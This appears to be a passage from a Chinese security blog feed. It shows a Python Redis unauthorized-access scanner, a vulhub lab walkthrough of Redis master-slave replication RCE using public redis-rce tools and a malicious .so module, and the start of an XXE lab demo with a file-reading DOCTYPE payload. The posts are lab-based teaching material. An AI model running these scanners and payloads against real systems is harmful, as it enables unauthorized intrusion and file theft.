[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = socket.socket()  # 创建socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = &amp;quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    socket.setdefaulttimeout(10)  # 限制时间&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for ip in url:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            s.connect((ip, int(port)))  # 进行发送&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            s.sendall(payload.encode())  # 判断每次发送的内容量，删除重合&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            resves = s.recv(1024).decode()  # 创建存储&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if resves and &amp;#x27;redis_version&amp;#x27; in resves:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                result.append(str(ip) + &amp;quot;:&amp;quot; + str(port) + &amp;#x27;:&amp;#x27; + &amp;#x27;\033[1;32;40msuccess\033[0m&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result.append(str(ip) + &amp;#x27;:&amp;#x27; + str(port) + &amp;#x27;:&amp;#x27; + &amp;#x27;\033[1;31;40mfailed \033[0m&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return (result)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来针对 IP 区段内的网络主机进行未授权访问检测，在进行内网渗透测试的过程中，由于输入单个 IP 地址进行测试较为复杂，因此有必要进行 IP 段段内检测。该部分代码主要以特殊字符 &amp;quot;-&amp;quot; 为目标字符进行分隔，将分隔后的字符进行 for 循环存入列表中，以便被函数 redis_unauthored () 调用&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def url_list(li):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ss = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    j = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    zi = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for s in li:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a = s.find(&amp;#x27;-&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = i + 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if a != -1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ss = s.rsplit(&amp;quot;-&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            j = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for s in range(int(ss[0]), int(ss[1]) + 1):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        li[j - 1] = str(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        aa = &amp;#x27;.&amp;#x27;.join(li)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        zi.append(aa)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return zi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def url_exec(url):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    zi = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    group = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    group1 = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    group2 = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    li = url.split(&amp;#x27;.&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (url.find(&amp;#x27;-&amp;#x27;) == -1):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        group.append(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        zi = group&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for s in li:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            a = s.find(&amp;#x27;-&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if a != -1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                i = i + 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        zi = url_list(li)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if i &amp;gt; 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for li in zi:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                zz = url_list(li.split(&amp;#x27;.&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                for ki in zz:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    group.append(ki)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                zi = group&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                i = i - 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if i &amp;gt; 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for li in zi:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                zzz = url_list(li.split(&amp;#x27;.&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                for ki in zzz:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    group1.append(ki)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            zi = group1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            i = i - 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if i &amp;gt; 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for li in zi:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                key = url_list(li.split(&amp;#x27;.&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                for ki in key:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    group2.append(ki)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            zi = group2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return zi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;设置数据的输出格式，使输出的数据更加美观、简洁，增加可读性。该部分代码的输出字段主要分三段信息，其中包括 IP 地址、端口号、状态信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def output_exec(output, type):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;\033[1;32;40m&amp;quot; + type + &amp;quot;......\033[0m&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;++++++++++++++++++++++++++++++++++++++++++++++++&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;|         ip         |    port   |     status  |&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for li in output:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;quot;+-----------------+-----------+--------------+&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;quot;|   &amp;quot; + li.replace(&amp;quot;:&amp;quot;, &amp;quot;   |    &amp;quot;) + &amp;quot;  | &amp;quot;)  # 替换字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;+----------------+------------+---------------+\n&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;[*] shutting down....&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;该脚本的原理比较简单，我们用 redis-cli 连接过的知道，如果存在未授权漏洞那么 info 命令能输出诸多信息，这里就利用了这个方法，发送 info 的 payload，用函数接收回显信息，判断信息中带有的特殊字段，来判断是否存在漏洞&lt;br&gt;
&lt;strong&gt;利用主从复制进行 RCE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上面介绍了拥有 root 权限的 redis 怎么拿 shell，但是也有很多时候 redis 不被赋予 root 权限，这时候就需要用到上面所说的主从复制的知识点来进行 RCE&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;主从模式指使用一个 redis 作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在 Reids&lt;br&gt;
4.x 之后，通过外部拓展，可以实现在 redis 中实现一个新的 Redis 命令，构造恶意.so 文件。在两个 Redis 实例设置主从模式的时候，Redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载恶意 so 文件，即可执行命令。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;搭建 vulhub 靶场&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;开启&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aiByWcFPqwF5ChJl.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看 docker 中启动的进程&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker ps -a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v5eDdeSSOFNFyOuy.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里得到刚才启动的 redis 容器的 ID 为 25137f98e35d&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker exec -it 25137f98e35d /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;进入容器&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/hosts&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查看容器 IP&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XRBrApApv5QKxI2N.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到容器 IP 为 172.18.0.2，该 IP 就作为目标 ip 也就是靶机来进行攻击，当然也可以以搭建环境的这台虚拟机来作为靶机，因为 6379 端口已经自动映射出去了&lt;/p&gt;
&lt;p&gt;接下来先测试连接 redis&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DTAcyuTMdPkTLcCv.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功，接着利用脚本进行主从复制 getshell&lt;/p&gt;
&lt;p&gt;工具脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand（需要make）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/Ridter/redis-rce.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/vulhub/redis-rogue-getshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/jas502n/Redis-RCE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;工具下载总结来自：https://blog.51cto.com/u_12343119/5850923&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下载完成后进入目录执行脚本并且使用 exp_lin.so 文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 ./redis-rce.py -r 172.18.0.2 -p 6379 -L 192.168.40.136 -f exp_lin.so&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kQrxYZJ4Sc1R45BM.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功 getshell&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;redis 防御策略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. 禁止远程使用高危命令&lt;/p&gt;
&lt;p&gt;2. 低权限运行 redis 服务&lt;/p&gt;
&lt;p&gt;3. 禁止外网访问 redis&lt;/p&gt;
&lt;p&gt;4. 阻止其他用户添加新的公钥，将 authorized_keys 的权限设置为对拥有者只读&lt;/p&gt;
</content>
        <category term="其它" />
        <updated>2024-04-16T05:58:19.057Z</updated>
    </entry>
    <entry>
        <id>https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
        <title>外部实体注入漏洞</title>
        <link rel="alternate" href="https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;p&gt;当允许引用外部实体时，会造成外部实体注入（XXE）漏洞。通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害&lt;/p&gt;
&lt;p&gt;根据有无回显的情况，XXE 漏洞可分为如下两种：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;有回显的XXE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;无回显的XXE&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以 XXE-Lab 靶场来进行演示&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JVDd4I64OrHmuUSn.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;有回显 XXE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先在自己的 C 盘目录下创建一个 txt 文件，内容随便，这里就以 1.txt 和 hacker！！！来进行演示&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;UserName：&amp;amp;b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password：admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;抓包 Login 并发送到重发器&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rbo8AxajVDsDApvV.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里可以看到是以 xml 的形式发送到 doLogin.php 进行解析，那就直接试着在 body 中加入 xml 的内容，看看是否能被解析&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE test[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY b SYSTEM &amp;quot;file:///c:/1.txt&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造 payload 对 C 盘下的 1.txt 文件进行读取， &lt;code&gt;&amp;lt;!ENTITY b SYSTEM &amp;quot;file:///c:/1.txt&amp;quot;&amp;gt;&lt;/code&gt;  中的 b 为用户名中的参数，&amp;quot;&amp;quot; 之间为读取文件以及文件路径&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file:///                #file协议读取文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://url/file.txt     #http协议读取站点下的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHP://filter            #文件流形式读取php文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QD1z7SIb6qNXsosT.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功读取，修改 txt 中的内容为 Hello hacker!!! 再试一遍&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7J9GFIIAnSDLuZsJ.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;无回显 XXE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接下来进行无回显的 XXE 演示。在这之前需要关闭靶场的信息输出，打开靶场目录下的 php_xxe/doLogin.php 文件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 注释 echo $result;&lt;br&gt;
